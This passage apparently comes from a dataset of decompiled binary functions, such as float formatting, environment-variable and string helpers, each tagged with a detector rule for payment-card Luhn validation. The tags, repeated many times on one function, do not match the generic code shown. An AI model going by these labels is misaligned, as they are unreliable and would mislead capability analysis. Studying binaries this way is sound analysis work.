CONCAT22(var_ch._2_2_, var_ch);\n                            var_8h._0_2_ = CONCAT22(var_8h._2_2_, var_8h) >> 1;\n                            var_8h._2_2_ = var_8h._2_2_ >> 1;\n                            var_ch._2_2_ = var_ch._2_2_ >> 1 | (iVar3 << 0x1f) >> 0x10;\n                            uVar11 = CONCAT22(var_10h._2_2_, CONCAT11(var_10h._1_1_, var_10h)) >> 1;\n                            var_10h._2_2_ = var_10h._2_2_ >> 1 | (iVar6 << 0x1f) >> 0x10;\n                            uVar13 = uVar13 - 1;\n                            var_ch._0_2_ = uVar15 >> 1;\n                            var_10h._0_1_ = uVar11;\n                            var_10h._1_1_ = uVar11 >> 8;\n                        } while (uVar13 != 0);\n                        if (var_50h != 0) {\n                            var_10h._0_1_ = var_10h | 1;\n                        }\n                    }\n                }\n                else {\n                    do {\n                        uVar9 = var_ch._2_2_;\n                        uVar19 = var_10h._2_2_;\n                        if (var_8h._2_2_ < 0) break;\n                        iVar3 = CONCAT22(var_10h._2_2_, CONCAT11(var_10h._1_1_, var_10h)) << 1;\n                        var_10h._0_1_ = iVar3;\n                        var_10h._1_1_ = iVar3 >> 8;\n                        var_10h._2_2_ = iVar3 >> 0x10;\n                        iVar3 = CONCAT22(var_ch._2_2_, var_ch) * 2;\n                        var_ch._0_2_ = iVar3 | uVar19 >> 0xf;\n                        var_ch._2_2_ = iVar3 >> 0x10;\n                        iVar3 = CONCAT22(var_8h._2_2_, var_8h) * 2;\n                        var_8h._0_2_ = iVar3 | uVar9 >> 0xf;\n                        iVar6 = iVar6 + 0xffff;\n                        var_8h._2_2_ = iVar3 >> 0x10;\n                    } while (0 < iVar6);\n                    uVar19 = iVar6;\n                    if (uVar19 < 1) goto code_r0x0042689f;\n                }\n                if ((0x8000 < CONCAT11(var_10h._1_1_, var_10h)) ||\n                   ((CONCAT22(var_10h._2_2_, CONCAT11(var_10h._1_1_, var_10h)) & 0x1ffff) == 0x18000)) {\n                    if (CONCAT22(var_ch, var_10h._2_2_) == -1) {\n                        var_10h._2_2_ = 0;\n                        var_ch._0_2_ = 0;\n                        if (CONCAT22(var_8h, var_ch._2_2_) == -1) {\n                            var_ch._2_2_ = 0;\n                            var_8h._0_2_ = 0;\n                            if (var_8h._2_2_ == 0xffff) {\n                                var_8h._2_2_ = 0x8000;\n                                uVar19 = uVar19 + 1;\n                            }\n                            else {\n                                var_8h._2_2_ = var_8h._2_2_ + 1;\n                            }\n                        }\n                        else {\n                            iVar6 = CONCAT22(var_8h, var_ch._2_2_) + 1;\n                            var_ch._2_2_ = iVar6;\n                            var_8h._0_2_ = iVar6 >> 0x10;\n                        }\n                    }\n                    else {\n                        iVar6 = CONCAT22(var_ch, var_10h._2_2_) + 1;\n                        var_10h._2_2_ = iVar6;\n                        var_ch._0_2_ = iVar6 >> 0x10;\n                    }\n                }\n                noname_1 = CONCAT22(var_ch._2_2_, var_ch);\n                if (uVar19 < 0x7fff) {\n                    var_16h._1_1_ = uVar19 >> 8 | var_16h._1_1_ & 0x80;\n                    var_20h._0_2_ = var_10h._2_2_;\n                    arg_8h = CONCAT22(var_10h._2_2_, var_ch);\n                    var_1ch = var_ch._2_2_;\n                    var_1ah = CONCAT22(var_8h._2_2_, var_8h);\n                    var_16h._0_1_ = uVar19;\n                }\n                else {\n                    var_1ch = 0;\n                    var_20h._0_2_ = 0;\n                    arg_8h = var_10h._2_2_ << 0x10;\n                    iVar6 = (((var_16h._1_1_ & 0x80) == 0) - 1 & 0x80000000) + 0x7fff8000;\n                    var_1ah = 0x80000000;\n                    var_16h._0_1_ = iVar6 >> 0x10;\n                    var_16h._1_1_ = iVar6 >> 0x18;\n                    noname_1 = CONCAT22(var_ch._2_2_, var_ch);\n                }\n                goto code_r0x004269a6;\n            }\n            iVar6 = 0;\n        }\n        else {\n            iVar6 = (((var_16h._1_1_ & 0x80) == 0) - 1 & 0x80000000) + 0x7fff8000;\n        }\n        var_1ch = 0;\n        arg_8h = 0;\n        var_20h._0_2_ = 0;\n        var_1ah = iVar6 << 0x10;\n        var_16h._0_1_ = iVar6 >> 0x10;\n        var_16h._1_1_ = iVar6 >> 0x18;\n        noname_1 = 0;\n    }\ncode_r0x004269a6:\n    var_10h._2_2_ = arg_8h >> 0x10;\n    var_20h._2_2_ = arg_8h;\n    *arg_1ch = var_4ch;\n    if (((arg_18h & 1) == 0) || (arg_14h = arg_14h + var_4ch,  0 < arg_14h)) {\n        if (0x15 < arg_14h) {\n            arg_14h = 0x15;\n        }\n        iVar6 = CONCAT11(var_16h._1_1_, var_16h) - 0x3ffe;\n        var_16h._0_1_ = 0;\n        var_16h._1_1_ = 0;\n        var_44h = 8;\n        do {\n            uVar19 = var_20h._2_2_;\n            var_1ah._2_2_ = var_1ah >> 0x10;\n            iVar3 = CONCAT22(var_20h._2_2_, var_20h) << 1;\n            var_20h._0_2_ = iVar3;\n            var_20h._2_2_ = iVar3 >> 0x10;\n            iVar3 = CONCAT22(var_1ah, var_1ch) * 2;\n            var_1ch = iVar3 | uVar19 >> 0xf;\n            iVar4 = CONCAT13(var_16h._1_1_, CONCAT12(var_16h, var_1ah._2_2_)) * 2;\n            var_1ah._2_2_ = iVar4 | var_1ah >> 0xf;\n            var_44h = var_44h + -1;\n            var_1ah._0_2_ = iVar3 >> 0x10;\n            var_16h._0_1_ = iVar4 >> 0x10;\n            var_16h._1_1_ = iVar4 >> 0x18;\n        } while (var_44h != 0);\n        if ((iVar6 < 0) && (uVar13 = -iVar6 & 0xff,  uVar13 != 0)) {\n            do {\n                iVar3 = CONCAT13(var_16h._1_1_, CONCAT12(var_16h, var_1ah._2_2_));\n                uVar11 = CONCAT22(var_1ah, var_1ch);\n                iVar6 = CONCAT22(var_1ah, var_1ch);\n                uVar15 = CONCAT13(var_16h._1_1_, CONCAT12(var_16h, var_1ah._2_2_)) >> 1;\n                var_1ah._2_2_ = uVar15;\n                var_16h._0_1_ = uVar15 >> 0x10;\n                var_16h._1_1_ = var_16h._1_1_ >> 1;\n                var_1ah._0_2_ = var_1ah >> 1 | (iVar3 << 0x1f) >> 0x10;\n                uVar15 = CONCAT22(var_20h._2_2_, var_20h);\n                var_20h._2_2_ = var_20h._2_2_ >> 1 | (iVar6 << 0x1f) >> 0x10;\n                uVar13 = uVar13 - 1;\n                var_1ch = uVar11 >> 1;\n                var_20h._0_2_ = uVar15 >> 1;\n            } while (0 < uVar13);\n        }\n        piVar1 = arg_1ch + 2;\n        piVar16 = piVar1;\n        uVar19 = var_20h;\n        uVar9 = var_20h._2_2_;\n        uVar12 = var_1ch;\n        uVar18 = var_1ah;\n        for (arg_14h = arg_14h + 1; var_1ah = CONCAT22(var_1ah._2_2_, uVar18),  0 < arg_14h; arg_14h = arg_14h + -1) {\n            var_34h = CONCAT13(var_16h._1_1_, CONCAT12(var_16h, var_1ah._2_2_));\n            uVar15 = CONCAT22(uVar9, uVar19) * 4;\n            uVar13 = CONCAT22(uVar18, uVar12) * 2;\n            uVar11 = (CONCAT13(var_16h._1_1_, CONCAT12(var_16h, var_1ah._2_2_)) * 2 | uVar18 >> 0xf) * 2 |\n                     uVar13 >> 0x1f;\n            uVar20 = (uVar13 | uVar9 >> 0xf) * 2 | (CONCAT22(uVar9, uVar19) << 1) >> 0x1f;\n            uVar13 = CONCAT22(uVar9, uVar19) + uVar15;\n            if ((uVar13 < uVar15) || (uVar15 = uVar20,  uVar13 < CONCAT22(uVar9, uVar19))) {\n                uVar15 = uVar20 + 1;\n                bVar5 = false;\n                if ((uVar15 < uVar20) || (uVar15 == 0)) {\n                    bVar5 = true;\n                }\n                if (bVar5) {\n                    uVar11 = uVar11 + 1;\n                }\n            }\n            uVar20 = CONCAT22(uVar18, uVar12) + uVar15;\n            if ((uVar20 < uVar15) || (uVar20 < CONCAT22(uVar18, uVar12))) {\n                uVar11 = uVar11 + 1;\n            }\n            iVar6 = (uVar11 + var_34h) * 2;\n            var_1ah._2_2_ = iVar6 | uVar20 >> 0x1f;\n            var_20h._0_2_ = uVar13 * 2;\n            var_20h._2_2_ = uVar13 * 2 >> 0x10;\n            var_16h._0_1_ = iVar6 >> 0x10;\n            var_1ch = uVar20 * 2 | uVar13 >> 0x1f;\n            *piVar16 = (iVar6 >> 0x18) + '0';\n            piVar16 = piVar16 + 1;\n            var_1ah._0_2_ = uVar20 * 2 >> 0x10;\n            var_16h._1_1_ = 0;\n            var_3ch._0_2_ = uVar19;\n            var_3ch._2_2_ = uVar9;\n            var_38h._0_2_ = uVar12;\n            var_38h._2_2_ = uVar18;\n            uVar19 = var_20h;\n            uVar9 = var_20h._2_2_;\n            uVar12 = var_1ch;\n            uVar18 = var_1ah;\n        }\n        piVar17 = piVar16 + -1;\n        var_20h._0_2_ = uVar19;\n        var_20h._2_2_ = uVar9;\n        var_1ch = uVar12;\n        if (*(piVar16 + -1) < '5') {\n            for (; (piVar1 <= piVar17 && (*piVar17 == '0')); piVar17 = piVar17 + -1) {\n            }\n            if (piVar17 < piVar1) {\n                *arg_1ch = 0;\n                *(arg_1ch + 3) = 1;\n                *(arg_1ch + 1) = ((uVar8 != 0x8000) - 1U & 0xd) + 0x20;\n                *piVar1 = 0x30;\n                *(arg_1ch + 5) = 0;\n                goto code_r0x00426b6e;\n            }\n        }\n        else {\n            for (; (piVar1 <= piVar17 && (*piVar17 == '9')); piVar17 = piVar17 + -1) {\n                *piVar17 = 0x30;\n            }\n            if (piVar17 < piVar1) {\n                piVar17 = piVar17 + 1;\n                *arg_1ch = *arg_1ch + 1;\n            }\n            *piVar17 = *piVar17 + '\\x01';\n        }\n        cVar14 = (piVar17 - arg_1ch) + -3;\n        *(arg_1ch + 3) = cVar14;\n        *(cVar14 + 4 + arg_1ch) = 0;\n    }\n    else {\n        *arg_1ch = 0;\n        *(arg_1ch + 3) = 1;\n        *(arg_1ch + 1) = ((uVar8 != 0x8000) - 1U & 0xd) + 0x20;\n        *(arg_1ch + 2) = 0x30;\n        *(arg_1ch + 5) = 0;\n    }\ncode_r0x00426b6e:\n    var_ch = noname_1;\n    fcn.00410f95(1);\n    return;\n}\n",
        "token_count": 8987
    },
    "00426c48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00426c48(uint param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = 0;\n    if ((param_2 & 0x10) != 0) {\n        uVar1 = 0x80;\n    }\n    if ((param_2 & 8) != 0) {\n        uVar1 = uVar1 | 0x200;\n    }\n    if ((param_2 & 4) != 0) {\n        uVar1 = uVar1 | 0x400;\n    }\n    if ((param_2 & 2) != 0) {\n        uVar1 = uVar1 | 0x800;\n    }\n    if ((param_2 & 1) != 0) {\n        uVar1 = uVar1 | 0x1000;\n    }\n    if ((param_2 & 0x80000) != 0) {\n        uVar1 = uVar1 | 0x100;\n    }\n    uVar2 = param_2 & 0x300;\n    if (uVar2 != 0) {\n        if (uVar2 == 0x100) {\n            uVar1 = uVar1 | 0x2000;\n        }\n        else if (uVar2 == 0x200) {\n            uVar1 = uVar1 | 0x4000;\n        }\n        else if (uVar2 == 0x300) {\n            uVar1 = uVar1 | 0x6000;\n        }\n    }\n    param_2 = param_2 & 0x3000000;\n    if (param_2 == 0x1000000) {\n        uVar1 = uVar1 | 0x8040;\n    }\n    else {\n        if (param_2 == 0x2000000) {\n            return uVar1 | 0x40;\n        }\n        if (param_2 == 0x3000000) {\n            return uVar1 | 0x8000;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 475
    },
    "00427623": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00427623(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    uint32_t arg_10h;\n    int32_t arg_8h_00;\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t arg_ch_00;\n    int32_t *piVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uchar *puVar7;\n    int32_t *piVar8;\n    bool bVar9;\n    uint arg_ch_01;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    if (arg_8h == NULL) {\n        puVar1 = fcn.004125de();\n        *puVar1 = 0x16;\n        fcn.00415a3c(0, 0, 0, 0, 0);\n        return 0xffffffff;\n    }\n    arg_8h_00 = *arg_8h;\n    if (((arg_8h_00 == 0) || (iVar2 = fcn.004146be(arg_8h_00, 0x3d),  iVar2 == 0)) || (arg_8h_00 == iVar2)) {\ncode_r0x004276b3:\n        puVar1 = fcn.004125de();\n        *puVar1 = 0x16;\n        return 0xffffffff;\n    }\n    bVar9 = *(iVar2 + 1) == '\\0';\n    if (*0x439128 == *0x43912c) {\n        *0x439128 = fcn.004275c9();\n    }\n    if (*0x439128 == NULL) {\n        if ((arg_ch == 0) || (*0x439130 == NULL)) {\n            if (bVar9) {\n                return 0;\n            }\n            *0x439128 = fcn.0041c21c(4);\n            if (*0x439128 == NULL) {\n                return 0xffffffff;\n            }\n            **0x439128 = 0;\n            if (*0x439130 == NULL) {\n                *0x439130 = fcn.0041c21c(4);\n                if (*0x439130 == NULL) {\n                    return 0xffffffff;\n                }\n                **0x439130 = 0;\n            }\n        }\n        else {\n            iVar3 = fcn.00424f3d();\n            if (iVar3 != 0) goto code_r0x004276b3;\n        }\n    }\n    piVar4 = *0x439128;\n    if (*0x439128 == NULL) {\n        return 0xffffffff;\n    }\n    arg_ch_00 = fcn.00427577(arg_8h_00);\n    if ((arg_ch_00 < 0) || (*piVar4 == 0)) {\n        if (bVar9) {\n            fcn.00410dee(arg_8h_00);\n            *arg_8h = 0;\n            return 0;\n        }\n        if (arg_ch_00 < 0) {\n            arg_ch_00 = -arg_ch_00;\n        }\n        arg_10h = arg_ch_00 + 2;\n        if (arg_10h < arg_ch_00) {\n            return 0xffffffff;\n        }\n        if (0x3ffffffe < arg_10h) {\n            return 0xffffffff;\n        }\n        piVar4 = fcn.0041c2fb(*0x439128, 4, arg_10h);\n        if (piVar4 == NULL) {\n            return 0xffffffff;\n        }\n        piVar4[arg_ch_00] = arg_8h_00;\n        (piVar4 + arg_ch_00)[1] = 0;\n        *arg_8h = 0;\n    }\n    else {\n        piVar8 = piVar4 + arg_ch_00;\n        fcn.00410dee(*piVar8);\n        if (!bVar9) {\n            *piVar8 = arg_8h_00;\n            *arg_8h = 0;\n            goto code_r0x004277c1;\n        }\n        while (*piVar8 != 0) {\n            *piVar8 = piVar8[1];\n            arg_ch_00 = arg_ch_00 + 1;\n            piVar8 = piVar4 + arg_ch_00;\n        }\n        if ((0x3ffffffe < arg_ch_00) || (piVar4 = fcn.0041c2fb(*0x439128, arg_ch_00, 4),  piVar4 == NULL))\n        goto code_r0x004277c1;\n    }\n    *0x439128 = piVar4;\ncode_r0x004277c1:\n    if (arg_ch != 0) {\n        arg_ch_01 = 1;\n        iVar3 = fcn.004121f0(arg_8h_00);\n        iVar3 = fcn.0041c261(iVar3 + 2, arg_ch_01);\n        if (iVar3 != 0) {\n            iVar6 = arg_8h_00;\n            iVar5 = fcn.004121f0(arg_8h_00);\n            iVar6 = fcn.0041291c(iVar3, iVar5 + 2, iVar6);\n            if (iVar6 != 0) {\n                fcn.00415914(0, 0, 0, 0, 0);\n            }\n            puVar7 = (iVar3 - arg_8h_00) + iVar2;\n            *puVar7 = 0;\n            iVar2 = func_0x004deb4c(0, iVar3, ~-bVar9 & puVar7 + 1);\n            if (iVar2 == 0) {\n                var_ch = 0xffffffff;\n                puVar1 = fcn.004125de();\n                *puVar1 = 0x2a;\n            }\n            fcn.00410dee(iVar3);\n        }\n    }\n    if (bVar9) {\n        fcn.00410dee(arg_8h_00);\n        *arg_8h = 0;\n        return var_ch;\n    }\n    return var_ch;\n}\n",
        "token_count": 1402
    },
    "00427c82": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00427c82(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0041227b(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    arg_8h_00 = *(unaff_EBP + 8);\n    fcn.00410c06(arg_8h_00);\n    *(unaff_EBP + -4) = 0;\n    *extraout_ECX = vtable.std::logic_error.0;\n    fcn.00403ed0(arg_8h_00 + 0xc);\n    fcn.00412353();\n    return;\n}\n",
        "token_count": 199
    },
    "00427f57": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00427f57(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if (*param_1 != -4) {\n        if (*param_1 == 0) {\n            fcn.00415a62();\n        }\n        iVar1 = *param_1;\n        if (*(iVar1 + 0x18) < 0x10) {\n            iVar2 = iVar1 + 4;\n        }\n        else {\n            iVar2 = *(iVar1 + 4);\n        }\n        if (*(iVar1 + 0x14) + iVar2 <= param_1[1]) {\n            fcn.00415a62();\n        }\n    }\n    return param_1[1];\n}\n",
        "token_count": 169
    },
    "00427fb3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00427fb3(int32_t param_1)\n\n{\n    if (0 < *(param_1 + 0x14)) {\n        fcn.00410dee(*(param_1 + 0x10));\n        return;\n    }\n    if (*(param_1 + 0x14) < 0) {\n        fcn.00405af2(*(param_1 + 0x10));\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "00428873": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00428873(uint32_t arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    \n    if (-*(in_ECX + 0x14) - 1U <= arg_8h) {\n        fcn.00427c12();\n    }\n    if (arg_8h != 0) {\n        iVar2 = *(in_ECX + 0x14) + arg_8h;\n        cVar1 = fcn.00403940(iVar2, 0);\n        if (cVar1 != '\\0') {\n            fcn.004282b6(*(in_ECX + 0x14), arg_8h, arg_ch);\n            fcn.004034f0(iVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 187
    },
    "00429ba6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00429ba6(uint param_1)\n\n{\n    fcn.00410fb0(param_1, 0, 0x18);\n    return param_1;\n}\n",
        "token_count": 44
    },
    "00411b19": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00411b19(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.0041c051(arg_8h, arg_ch, arg_10h, arg_14h, in_EAX, 0, 0, 0);\n    return uVar1;\n}\n",
        "token_count": 111
    },
    "0043b040": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043b040(uint arg_8h)\n\n{\n    int64_t iVar1;\n    int32_t in_EAX;\n    int32_t arg_8h_00;\n    int32_t *unaff_ESI;\n    \n    unaff_ESI[1] = in_EAX;\n    iVar1 = (in_EAX + 1) * 2;\n    *unaff_ESI = 0;\n    arg_8h_00 = fcn.0044d234(-(iVar1 >> 0x20 != 0) | iVar1);\n    *unaff_ESI = arg_8h_00;\n    fcn.00452100(arg_8h_00, arg_8h, unaff_ESI[1] * 2);\n    *(*unaff_ESI + unaff_ESI[1] * 2) = 0;\n    return;\n}\n",
        "token_count": 195
    },
    "0043b0a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043b0a0(uint arg_8h, int32_t arg_ch)\n\n{\n    int64_t iVar1;\n    int32_t arg_8h_00;\n    int32_t *unaff_ESI;\n    int32_t iVar2;\n    \n    iVar2 = unaff_ESI[1] + arg_ch;\n    iVar1 = (iVar2 + 1) * 2;\n    arg_8h_00 = fcn.0044d234(-(iVar1 >> 0x20 != 0) | iVar1);\n    fcn.00452100(arg_8h_00, *unaff_ESI, unaff_ESI[1] * 2);\n    fcn.00452100(arg_8h_00 + unaff_ESI[1] * 2, arg_8h, arg_ch * 2);\n    *(arg_8h_00 + iVar2 * 2) = 0;\n    fcn.0044d924(*unaff_ESI);\n    unaff_ESI[1] = iVar2;\n    *unaff_ESI = arg_8h_00;\n    return;\n}\n",
        "token_count": 253
    },
    "0043d620": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043d620(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t *unaff_ESI;\n    \n    iVar1 = unaff_ESI[1];\n    if (unaff_ESI[2] == iVar1) {\n        uVar3 = 1;\n        if (iVar1 != 0) {\n            uVar3 = iVar1 * 2;\n        }\n        iVar1 = fcn.0044d234(-(uVar3 * 4 >> 0x20 != 0) | uVar3 * 4);\n        uVar2 = 0;\n        if (unaff_ESI[2] != 0) {\n            do {\n                *(iVar1 + uVar2 * 4) = *(*unaff_ESI + uVar2 * 4);\n                uVar2 = uVar2 + 1;\n            } while (uVar2 < unaff_ESI[2]);\n        }\n        fcn.0044d924(*unaff_ESI);\n        *unaff_ESI = iVar1;\n        unaff_ESI[1] = uVar3;\n    }\n    *(*unaff_ESI + unaff_ESI[2] * 4) = *arg_8h;\n    unaff_ESI[2] = unaff_ESI[2] + 1;\n    return;\n}\n",
        "token_count": 314
    },
    "0043d6b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043d6b0(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t *unaff_ESI;\n    \n    iVar1 = unaff_ESI[1];\n    if (unaff_ESI[2] == iVar1) {\n        uVar3 = 1;\n        if (iVar1 != 0) {\n            uVar3 = iVar1 * 2;\n        }\n        iVar1 = fcn.0044d234(-(uVar3 * 4 >> 0x20 != 0) | uVar3 * 4);\n        uVar2 = 0;\n        if (unaff_ESI[2] != 0) {\n            do {\n                *(iVar1 + uVar2 * 4) = *(*unaff_ESI + uVar2 * 4);\n                uVar2 = uVar2 + 1;\n            } while (uVar2 < unaff_ESI[2]);\n        }\n        fcn.0044d924(*unaff_ESI);\n        *unaff_ESI = iVar1;\n        unaff_ESI[1] = uVar3;\n    }\n    *(*unaff_ESI + unaff_ESI[2] * 4) = *arg_8h;\n    unaff_ESI[2] = unaff_ESI[2] + 1;\n    return;\n}\n",
        "token_count": 316
    },
    "0043e4c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0043e4c0(void)\n\n{\n    fcn.0053c532(0x71ffb752);\n    return;\n}\n",
        "token_count": 33
    },
    "0043f450": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
